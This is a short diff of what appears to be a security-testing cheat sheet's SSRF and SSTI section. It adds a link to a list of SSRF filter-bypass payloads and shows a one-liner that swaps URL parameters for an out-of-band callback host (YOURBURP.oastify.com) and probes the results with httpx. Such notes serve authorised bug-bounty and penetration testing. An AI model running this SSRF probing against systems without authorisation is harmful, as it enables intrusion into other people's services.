@@ -4,6 +4,8 @@
 
 ## 🌐 SSRF & SSTI
 
+> 📄 Filter-bypass payload list: [`data/SSRF-bypass-payloads.txt`](../data/SSRF-bypass-payloads.txt)
+
 ### SSRF with Interactsh
 ```bash
 cat urls.txt | gf ssrf | qsreplace "https://YOURBURP.oastify.com" | httpx -silent
